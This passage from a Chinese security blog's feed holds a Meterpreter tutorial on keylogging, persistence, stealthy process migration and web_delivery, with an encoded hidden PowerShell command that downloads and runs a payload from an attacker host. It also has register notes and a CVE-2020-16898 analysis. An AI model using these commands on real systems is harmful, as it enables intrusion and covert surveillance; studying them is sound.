class="literal">-l</span> <span class="number">6666</span> <span class="literal">-p</span> <span class="number">3389</span> <span class="literal">-r</span> <span class="number">192.168</span>.<span class="number">119.145</span></span><br></pre></td></tr></table></figure><p>其中的参数分别为，本机开放的端口（6666），受害者开放的端口（3389），受害者的ip。</p><p><em>其实我这里也没明白，受害者不是内网IP吗？</em></p><h3 id="四、模拟用户操作"><a href="#四、模拟用户操作" class="headerlink" title="四、模拟用户操作"></a>四、模拟用户操作</h3><p><strong>enumdesktops</strong>： List all accessible desktops and window stations<br><strong>getdesktop</strong>：Get the current meterpreter desktop<br><strong>idletime</strong>：Returns the number of seconds the remote user has been idle<br><strong>keyboard_ send</strong>（模拟键盘输入）：Send keystrokes<br><strong>keyevent</strong>（模拟键盘事件）：Send key events<br><strong>keyscan_ start</strong>（开启键盘记录）：Start capturing keystrokes<br><strong>keyscan_ dump</strong>（输出到目前为止的键盘记录）：Dump the keystroke buffer<br><strong>keyscan_ stop</strong>（停止键盘记录）：Stop capturing keystrokes<br><strong>mouse</strong>（模拟鼠标事件）：Send mouse events<br><strong>screenshare</strong> ：Watch the remote user desktop in real time<br><strong>screenshot</strong>：Grab a screenshot of the interactive desktop<br><strong>setdesktop</strong>：Change the meterpreters current desktop<br><strong>uictl</strong>（夺取对方对于键盘和鼠标的控制权）：Control some of the user interface components</p><h3 id="五、持久化、进程迁移"><a href="#五、持久化、进程迁移" class="headerlink" title="五、持久化、进程迁移"></a>五、持久化、进程迁移</h3><h4 id="持久化："><a href="#持久化：" class="headerlink" title="持久化："></a>持久化：</h4><p>​    持久化就是指目标主机在重启后依然自动进行连接，要做到这一点，我们需要执行在metepreter下通过<code>run</code>命令实现。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run persistence <span class="literal">-h</span> <span class="comment">#查看有关持久化的帮助</span></span><br><span class="line">run persistence <span class="literal">-x</span> <span class="literal">-i</span> <span class="number">3</span> <span class="literal">-p</span> <span class="string">&#x27;监听端口&#x27;</span> <span class="literal">-r</span> <span class="string">&#x27;监听ip&#x27;</span></span><br></pre></td></tr></table></figure><p>第二条命令开启了一个，开机启动（-x），每隔三秒尝试连接一次（-i 3）的持久化连接。</p><p>具体实现是通过更改注册表实现的。</p><h4 id="进程迁移："><a href="#进程迁移：" class="headerlink" title="进程迁移："></a>进程迁移：</h4><p>​    为什么要进行进程迁移呢？其一，我们的木马若是绑定在其他程序上的，其他程序关闭后，木马也被关闭，无法继续运行；其二，若我们的木马是一个单独的进程，容易被发现并且消灭，太过于明显。因此，我们使用进程迁移的方式，让我们的木马附着到其他看似无害的进程上，以达到隐藏的效果。</p><p>​    要进行进程迁移，我们使用的是<code>migrate</code>命令。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">metepreter&gt; migrate <span class="string">&#x27;pid&#x27;</span> <span class="comment">#迁移到pid进程下</span></span><br></pre></td></tr></table></figure><p>注意别迁移到系统进程，容易造成崩溃，一般选择迁移到<strong>explorer</strong>进程中。</p><h2 id="0x04-多个木马连接"><a href="#0x04-多个木马连接" class="headerlink" title="0x04 多个木马连接"></a>0x04 多个木马连接</h2><p>​    metesploit可以通过session来管理对某个木马进行连接的用户，即，当有多个用户对我们的同一个端口部署的同一个木马进行连接时，我们可以保存他们的状态，并使用session来管理他们。</p><p>我们总结一下刚刚我们进行的步骤吧。</p><ol><li><code>msfconsole -q</code>打开msf6&gt;</li><li><code>use exploit/multi/handler</code>选模块，变为<code>msf exploit(muti/handler)&gt;</code></li><li>对所有参数进行配置，例如这里选择了meterpreter，</li><li><code>run</code>或者<code>exploit</code>运行监听，打开了<code>meterpreter&gt;</code>专属的命令行</li><li>然后我们按照0x03的各种操作进行操作即可。</li></ol><p>那么，我们在什么样的情况对sessions进行管理呢？</p><p>​    当我们不想继续进行命令操作的时候，我们就可以<strong>使用命令<code>background</code>退回上一层</strong>，也就是回到<code>msf exploit(muti/handler)&gt;</code>中，进行配置，我们输入命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sessions <span class="comment">#查看现有的session情况</span></span><br><span class="line"><span class="built_in">set</span> exitonsession false <span class="comment">#表示设置允许多个session存在</span></span><br><span class="line">show advanced <span class="comment">#查看拓展设置，包括刚刚设置的内容</span></span><br><span class="line">run <span class="literal">-j</span> <span class="comment">#运行刚刚哪些配置的监听，在后台监听连接</span></span><br><span class="line">jobs <span class="comment">#查看我们在后台运行的所有任务</span></span><br></pre></td></tr></table></figure><p>这样就配置好了一个多任务的环境，此时通过<strong>sessions</strong>命令进行查看，若有多个人进行连接了，我们使用：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session <span class="literal">-i</span> <span class="string">&#x27;sessions序号&#x27;</span></span><br></pre></td></tr></table></figure><p>对他进行meterpreter操作，使用命令<strong>background</strong>或者其简写<strong>bg</strong>退出当前session，最后，我们还可以使用。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">job <span class="literal">-K</span> <span class="comment">#关掉所有正在后台运行的监听任务</span></span><br></pre></td></tr></table></figure><h2 id="0x05-其他模块"><a href="#0x05-其他模块" class="headerlink" title="0x05 其他模块"></a>0x05 其他模块</h2><h3 id="web-delivery："><a href="#web-delivery：" class="headerlink" title="web_delivery："></a>web_delivery：</h3><p>要在对方主机上进行攻击，我们能直接上传并执行我们的木马文件必然是极好的，但是若我们具有exp的权限，能否在仅仅执行一句话的情况下就直接获得metepreter的权限呢？</p><p>我们可以使用模块：exploit/multi/script/<strong>web_delivery</strong>，使用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf  &gt;  use exploit/multi/script/web_delivery</span><br><span class="line">msf  &gt;  show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/script/web_delivery):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  <span class="number">0.0</span>.<span class="number">0.0</span>          yes       The local host or network interface to listen on. This must be an address on the local machine or <span class="number">0.0</span>.<span class="number">0.0</span> to listen on all addresses.</span><br><span class="line">   SRVPORT  <span class="number">8080</span>             yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL <span class="keyword">for</span> incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                   no        The URI to use <span class="keyword">for</span> this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (python/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  <span class="number">4444</span>             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Python</span><br></pre></td></tr></table></figure><p>可以看到，<strong>Payload</strong>、<strong>LHOST</strong>和<strong>LPORT</strong>的设置和上文中提到的方法是一样的，然后我们可以：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/script/web_delivery) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Python</span><br><span class="line">   <span class="number">1</span>   PHP</span><br><span class="line">   <span class="number">2</span>   PSH</span><br><span class="line">   <span class="number">3</span>   Regsvr32</span><br><span class="line">   <span class="number">4</span>   pubprn</span><br><span class="line">   <span class="number">5</span>   SyncAppvPublishingServer</span><br><span class="line">   <span class="number">6</span>   PSH (Binary)</span><br><span class="line">   <span class="number">7</span>   Linux</span><br><span class="line">   <span class="number">8</span>   Mac OS X</span><br></pre></td></tr></table></figure><p>可以看到，可选的语言还是很多的，我们选择只要是windows就会有的PSH，也就是powershell。</p><p>注：<strong>PSH</strong>和**PSH(Binary)**的区别是生成的内容是是正常的还是二进制编码过的，后者更不容易被识别。</p><p>二进制情况如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-e</span> WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB1AEEAVAA9ACIAZQBjAGgAbwAgACgAJABlAG4AdgA6AHQAZQBtAHAAKwAnAFwAcQBWAFoAWgBnAG0AOAB6AC4AZQB4AGUAJwApACIAOwAgACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADYALgAxADMAMAA6ADgAMAA4ADAALwAnACwAIAAkAHUAQQBUACkAOwAgAGkAbgB2AG8AawBlAC0AaQB0AGUAbQAgACQAdQBBAFQA</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>寄存器总结</title>
      <link href="/2022/03/17/%E5%B8%B8%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E5%8F%8A%E5%85%B6%E5%8A%9F%E8%83%BD%E6%80%BB%E7%BB%93/"/>
      <url>/2022/03/17/%E5%B8%B8%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E5%8F%8A%E5%85%B6%E5%8A%9F%E8%83%BD%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="寄存器总结"><a href="#寄存器总结" class="headerlink" title="寄存器总结"></a>寄存器总结</h1><p>16个寄存器可以被分成以下四类： </p><p>​    8个通用寄存器(General-purpose registers) </p><p>​    6个段寄存器(Segment registers) </p><p>​    程序状态与控制寄存器(EFLAGS) </p><p>​    指令指针寄存器(EIP register）</p><h2 id="一、通用寄存器"><a href="#一、通用寄存器" class="headerlink" title="一、通用寄存器:"></a>一、通用寄存器:</h2><p>32位CPU通用寄存器共有8个：<strong>EAX，EBX，ECX， EDX，ESI，EDI，EBP，ESP</strong></p><h3 id="第1-4个寄存器"><a href="#第1-4个寄存器" class="headerlink" title="第1- 4个寄存器:"></a>第1- 4个寄存器:</h3><ul><li><p><strong>EAX</strong>：累加寄存器，是操作数和结果数据的累加器 </p></li><li><p><strong>EBX</strong>：基址寄存器，指向DS段中数据的指针 </p></li><li><p><strong>ECX</strong>：计数寄存器，是字符串和循环操作的计数器 </p></li><li><p><strong>EDX</strong>：数据寄存器， I/O指针 </p></li></ul><p>上面4个寄存器主要用于算术运算（ADD/SUB/XOR/OR等） 指令中，常用来保存常量与变量的值</p><h3 id="变址寄存器（第5-6个）"><a href="#变址寄存器（第5-6个）" class="headerlink" title="变址寄存器（第5-6个）:"></a>变址寄存器（第5-6个）:</h3><ul><li><p><strong>ESI</strong>：(字符串操作源指针)源变址寄存器 </p></li><li><p><strong>EDI</strong>：(字符串操作目的指针)目的变址寄存器 </p></li></ul><p>​    <strong>ESI</strong>和<strong>EDI</strong>与特定的串操作指令（MOVS/LODS/STOS）一起使用，在字符串操作的时候用的比较多 </p><p>变址寄存器存放存储单元在段内的偏移量，用它们可实 现多种存储器操作数的寻址方式，为通过多种方式访问 存储单元提供便利</p><h3 id="指针寄存器（第7-8个）"><a href="#指针寄存器（第7-8个）" class="headerlink" title="指针寄存器（第7-8个）:"></a>指针寄存器（第7-8个）:</h3><ul><li><p><strong>ESP</strong>：栈顶指针寄存器，用于存放当前堆栈的栈顶 地址，专门用作堆栈指针，不可作为一般通用寄存 器使用 </p></li><li><p><strong>EBP</strong>：栈底指针寄存器（基址指针寄存器），表示 栈区域的基地址，永远指向当前函数栈的栈底位置， 不可作为一般通用寄存器使用</p></li></ul><h2 id="二、段寄存器"><a href="#二、段寄存器" class="headerlink" title="二、段寄存器:"></a>二、段寄存器:</h2><ul><li><p><strong>CS</strong>：Code Segment，代码段寄存器 – 存放应用程序代码所在段的段基址 </p></li><li><p><strong>DS</strong>：Data Segment，数据段寄存器 – 用于存放数据段的段基址 </p></li><li><p><strong>SS</strong>：Stack Segment，堆栈段寄存器 – 用于存放栈段的段基址 </p></li><li><p><strong>ES</strong>、<strong>FS</strong>、<strong>GS</strong>，附加数据段寄存器 – 用于存放程序使用的附加数据段的段基</p></li></ul><h2 id="三、程序状态与控制寄存器（标志寄存器）"><a href="#三、程序状态与控制寄存器（标志寄存器）" class="headerlink" title="三、程序状态与控制寄存器（标志寄存器）"></a>三、程序状态与控制寄存器（标志寄存器）</h2><p>在IA-32中标志寄存器的名称为<strong>EFLAGS</strong>，大小为4个字节， 共有32个位元，每个位数都有其作用，；</p><p>可以分为以下四类：</p><ul><li>系统标志(位8，9，14，16，17，18，19，20，21)和 IOPL(I/O Privilege Level)字段(位12，13) ： 控制操作系统或执行操作，应用程序不能修改以上标志位 </li><li>方向标志(DF，位10)：控制串操作指令的处理方向 ：DF=0，从低地址到高地址  DF=1，从高地址到低地址 </li><li>状态标志(位0，2，4，6，7和11)：表示算数指令的运 算结果，如ADD、SUB、MUL和DIV指令 ：和应用程序运行状态密切相关，需掌握 </li><li>预留标志位（位1，3，5，15，22-31） ：DO NOT US</li></ul><h3 id="状态标志-位0，2，4，6，7，-和11-："><a href="#状态标志-位0，2，4，6，7，-和11-：" class="headerlink" title="状态标志(位0，2，4，6，7， 和11) ："></a>状态标志(位0，2，4，6，7， 和11) ：</h3><p>（重点）</p><ul><li><p><strong>CF</strong>(位0) – 进位标志位：</p><p>一般情况下，在进行无符号数运算的时候，它记录了 运算结果的最高有效位向更高位的进位值，或从更高位的借位值。 – 在加法运算中，若运算结果从字或字节的最高位产生了进位，则 CF=1；否则CF=0 – 在减法运算中，若被减数无借位，则CF=0；否则CF=1 </p></li><li><p><strong>OF</strong>(位11) – 溢出标志位：</p><p>一般情况下，OF记录了有符号数运算的结果是否发生 了溢出 – 如果发生了溢出，OF=1；如果没有发生溢出，OF=0 – 注：CF和OF所表示的进位和溢出，是分别针对无符号数和有符号数 运算而言的，一定要分清楚CF和OF的发生条件 （2）寄存器 — 程序状态与控制寄存器 </p></li><li><p><strong>AF</strong>(位4) – 辅助进位标志位：</p><p>在发生以下情况时，辅助进位标志AF的值被 置为1，否则其值为0： » 在字操作时，发生低字节向高字节进位或借位时 » 在字节操作时，发生低4位向高4位进位或借位时 </p></li><li><p><strong>PF</strong>(位2) – 奇偶标志位：</p><p>记录相关指令执行后，其结果的最低有效字节中1 的个数是否为偶数 – 如果1的个数为偶数，PF=1；如果1的个数为奇数，PF=0 （2）寄存器 — 程序状态与控制寄存器 </p></li><li><p><strong>SF</strong>(位7) – 符号标志位：</p><p>记录相关指令执行后，其结果是否为负 – 当操作数为有符号数时，若结果为负数，SF=1；若结果为非负数， SF=0 </p></li><li><p><strong>ZF</strong>(位6) – 零标志位：</p><p>记录相关指令执行后，其结果是否为0；若运算结果 为0，则其值为1，否则其值为0</p></li></ul><h2 id="四、指令指针寄存器"><a href="#四、指令指针寄存器" class="headerlink" title="四、指令指针寄存器"></a>四、指令指针寄存器</h2><p>​    程序运行时，CPU会读取<strong>EIP</strong>中一条指令的地址， 将指令传送到指令缓冲区后，<strong>EIP</strong>的值自动增加 </p><p>​    CPU每次执行完一条指令，就会通过<strong>EIP</strong>寄存器 读取并执行下一条指令 </p><p>​    不能直接修改<strong>EIP</strong>的值，只能通过其他指令间接 修改 – 这些特定指令包括JMP、JC、CALL、RET – 可以通过中断或异常来修改<strong>EIP</strong>的值</p>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-16898漏洞分析与复现</title>
      <link href="/2022/03/14/CVE-2020-16898%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/14/CVE-2020-16898%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2020-16898漏洞分析与复现"><a href="#CVE-2020-16898漏洞分析与复现" class="headerlink" title="CVE-2020-16898漏洞分析与复现"></a>CVE-2020-16898漏洞分析与复现</h1><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220314103347935.png" alt="image-20220314103347935"></p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h2><p>​    本漏洞是由于Windows TCP/IP堆栈在处理ICMPv6的路由广播数据包时，处理逻辑存在纰漏，导致存在远程代码执行漏洞。成功利用该漏洞的攻击者可以在目标机器（主机或服务器）上执行任意代码，破环该主机。</p><h2 id="0x02-环境配置"><a href="#0x02-环境配置" class="headerlink" title="0x02 环境配置"></a>0x02 环境配置</h2><p>靶机——win server 2019</p><p>攻击者——win10主机</p><p>靶机使用NAT连接，开启IPV6：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220311094359026.png" alt="image-20220311094359026"></p><p><strong>fd15:4ba5:5a2b:1008:5dfd:a60a:67fe:fb59</strong></p><h2 id="0x03-原理分析"><a href="#0x03-原理分析" class="headerlink" title="0x03 原理分析"></a>0x03 原理分析</h2><h3 id="一、基本信息"><a href="#一、基本信息" class="headerlink" title="一、基本信息"></a>一、基本信息</h3><p>​    漏洞文件：tcpip.sys</p><p>​    漏洞函数：Ipv6pUpdateRDNSS()函数</p><p>​    漏洞对象：ICMPv6路由广播中的option结构</p><h3 id="二、tcpip-sys文件信息收集"><a href="#二、tcpip-sys文件信息收集" class="headerlink" title="二、tcpip.sys文件信息收集"></a>二、tcpip.sys文件信息收集</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220311103501654.png" alt="image-20220311103501654"></p><p>储存路径为：<em>windows\system32\drivers</em></p><h4 id="1-函数调用关系"><a href="#1-函数调用关系" class="headerlink" title="1.函数调用关系"></a>1.函数调用关系</h4><p>直接进入<em>Ipv6pUpdateRDNSS()函数</em>，右键查看调用关系：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220311131254716.png" alt="image-20220311131254716"></p><p><em>Icmpv6ReceiveDatagrams( ) -&gt; Ipv6pHandleRouterAdvertisement( ) -&gt; Ipv6pUpdateRDNSS( )</em></p><h4 id="2-重要结构体"><a href="#2-重要结构体" class="headerlink" title="2.重要结构体"></a>2.重要结构体</h4><p>首先，我们需要先了解一些出现的数据结构。</p><h5 id="NET-BUFFER："><a href="#NET-BUFFER：" class="headerlink" title="_NET_BUFFER："></a>_NET_BUFFER：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NET_BUFFER</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">      NET_BUFFER *Next;</span><br><span class="line">      MDL        *CurrentMdl;</span><br><span class="line">      ULONG      CurrentMdlOffset;</span><br><span class="line">      <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG  DataLength;</span><br><span class="line">        SIZE_T stDataLength;</span><br><span class="line">      &#125;;</span><br><span class="line">      MDL        *MdlChain;</span><br><span class="line">      ULONG      DataOffset;</span><br><span class="line">    &#125;;</span><br><span class="line">    SLIST_HEADER      Link;</span><br><span class="line">    NET_BUFFER_HEADER NetBufferHeader;</span><br><span class="line">  &#125;;</span><br><span class="line">  USHORT           ChecksumBias;</span><br><span class="line">  USHORT           Reserved;</span><br><span class="line">  NDIS_HANDLE      NdisPoolHandle;</span><br><span class="line">  PVOID            NdisReserved[<span class="number">2</span>];</span><br><span class="line">  PVOID            ProtocolReserved[<span class="number">6</span>];</span><br><span class="line">  PVOID            MiniportReserved[<span class="number">4</span>];</span><br><span class="line">  PHYSICAL_ADDRESS DataPhysicalAddress;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    NET_BUFFER_SHARED_MEMORY *SharedMemoryInfo;</span><br><span class="line">    SCATTER_GATHER_LIST      *ScatterGatherList;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125; NET_BUFFER, *PNET_BUFFER;</span><br><span class="line"></span><br><span class="line"><span class="comment">//from https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/nbl/ns-nbl-net_buffer</span></span><br></pre></td></tr></table></figure><p>在microsoft官网上，说明了_NET_BUFFER的作用：</p><blockquote><p>The NET_BUFFER structure specifies data that is transmitted or received over the network.</p></blockquote><p>用于传输或者接收固定的消息；</p><p>同时给出了：</p><blockquote><p>NDIS drivers can call the following functions to allocate and initialize a NET_BUFFER structure:</p><ul><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisallocatenetbuffer">NdisAllocateNetBuffer</a></li><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisallocatenetbufferandnetbufferlist">NdisAllocateNetBufferAndNetBufferList</a></li></ul></blockquote><p>可能调用上述两个函数初始化此结构体。</p><blockquote><p>Chained to each NET_BUFFER structure are one or more buffer descriptors that map buffers that contain network packet data. These buffer descriptors are specified as an MDL chain in the <strong>NetBufferHeader</strong> member. Such network packet data either was received or will be transmitted.</p></blockquote><p>我理解就是使用一个叫做MDL的结构体对_NET_BUFFER的缓冲区进行描述。</p><p>然后可以调用 NdisGetDataBuffer函数以从NET_BUFFER结构访问连续的数据块；</p><p>我们不关注这个结构体每个字段具体的作用，了解上述信息即可。</p><h5 id="MDL结构体"><a href="#MDL结构体" class="headerlink" title="MDL结构体"></a>MDL结构体</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MDL</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">MDL</span>      *<span class="title">Next</span>;</span></span><br><span class="line">  CSHORT           Size;</span><br><span class="line">  CSHORT           MdlFlags;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">EPROCESS</span> *<span class="title">Process</span>;</span></span><br><span class="line">  PVOID            MappedSystemVa;</span><br><span class="line">  PVOID            StartVa;</span><br><span class="line">  ULONG            ByteCount;</span><br><span class="line">  ULONG            ByteOffset;</span><br><span class="line">&#125; MDL, *PMDL;</span><br></pre></td></tr></table></figure><blockquote><p>Chained to each NET_BUFFER structure are one or more buffer descriptors that map buffers that contain network packet data. These buffer descriptors are specified as an MDL chain in the <strong>NetBufferHeader</strong> member. Such network packet data either was received or will be transmitted.</p><p>To access additional data space in the MDL chain, NDIS drivers can call the following functions:</p><ul><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisretreatnetbufferdatastart">NdisRetreatNetBufferDataStart</a></li><li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/nf-ndis-ndisretreatnetbufferlistdatastart">NdisRetreatNetBufferListDataStart</a></li></ul></blockquote><p>​    这个结构体的说明虽然我们看不太懂，但是大概意思就是说当需要使用NET BUFFER或者NET BUFFER LIST的内容时候，需要使用相应的MDL结构体，调用上述的函数进行调用。</p><blockquote><p>一个连续的虚拟内存地址范围可能是由多个分布（spread over）在不相邻的物理页所组成的。系统使用MDL（内存描述符表）结构体来表明虚拟内存缓冲区的物理页面布局。</p><p>总结：MDL就是描述一块虚拟内存的结构体，里面有个成员记录了多个页码，这些页码即处于各个不同物理地址的物理块的页号。</p><p><a href="http://www.doczj.com/doc/0a61613d9b6648d7c0c7460f.html">http://www.doczj.com/doc/0a61613d9b6648d7c0c7460f.html</a></p></blockquote><p>总结一下，就是我们有一个很复杂的NET BUFFER结构体，（大概因为结构体不是连续储存的？）与之对应的有一个MDL结构体来对应其指定的内存，当我们需要使用NET BUFFER中的信息时，需要使用NdisRetreatNetBufferDataStart函数进行调取数据。（其实没有太看懂，希望能有大佬解释）</p><h4 id="三、RDNSS-Option数据包："><a href="#三、RDNSS-Option数据包：" class="headerlink" title="三、RDNSS Option数据包："></a>三、RDNSS Option数据包：</h4><p>（本部分摘自<a href="https://blog.csdn.net/weixin_43815930/article/details/109328436%EF%BC%89">https://blog.csdn.net/weixin_43815930/article/details/109328436）</a></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/20201028120008448.png" alt="在这里插入图片描述"></p><ul><li>Type:<br>大小为8bits即<strong>1字节</strong>，字面理解此字段用于表述类型，RDNSS 的类型为<strong>25</strong></li><li>Length:<br>大小为8bits即<strong>1字节</strong>，选项的长度（包括“Type”和“Length”字段）以8个八位位组。如果该选项中<strong>包含一个IPv6地址，则最小值为3</strong> 。每增加一个RDNSS地址，长度就会增加2(因为每个地址长16bits即2个字节）。接收器使用“Length”字段来确定选项中IPv6地址的数量。</li><li>Reserved:<br>大小为16bits，<strong>2字节</strong>，保留字段</li><li>Lifetime:<br>32bits即<strong>4字节</strong>无符号整数。该RDNSS地址可以用于名称解析的最长时间</li><li>Addresses of IPv6 Recursive DNS Servers：<br>一个或多个128位即<strong>16字节的IPv6地址</strong> 。地址数确定通过长度字段。也就是说，地址数等于（Length-1）/ 2。</li></ul><p>也就是说总长为<strong>24字节</strong>。</p><p>之所以要知道这个报文的结构，是因为漏洞就出现在进行报文解析的部分。</p><h3 id="三、tcpip-sys文件逆向分析"><a href="#三、tcpip-sys文件逆向分析" class="headerlink" title="三、tcpip.sys文件逆向分析"></a>三、tcpip.sys文件逆向分析</h3><p><em>Icmpv6ReceiveDatagrams( ) -&gt; Ipv6pHandleRouterAdvertisement( ) -&gt; Ipv6pUpdateRDNSS( )</em></p><p>先进入：<strong>Ipv6pUpdateRDNSS( )</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220314111529055.png" alt="image-20220314111529055"></p><p>v37就是（Length-1）/ 2，相当于地址的个数。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220314114817247.png" alt="image-20220314114817247"></p><blockquote><p>在上面的处理过程中，存在一个问题：假设Length的长度为4，那么计算结束之后，AddressCount的值应该为1。</p><p>此时，按照正常逻辑，Ipv6pUpdateRDNSS()函数应该增加32字节（4*8）的缓冲区，但是后续在分配缓冲区时只分配了24字节：sizeof(ND_OPTION_RDNSS) + sizeof(IN6_ADDR) = 8 + 16 = 24，从而导致了溢出。</p><p>根据RFC8106的标准，Length字段的值应该满足最小为3的奇数的情况。当提供一个偶数Length值时，Windows 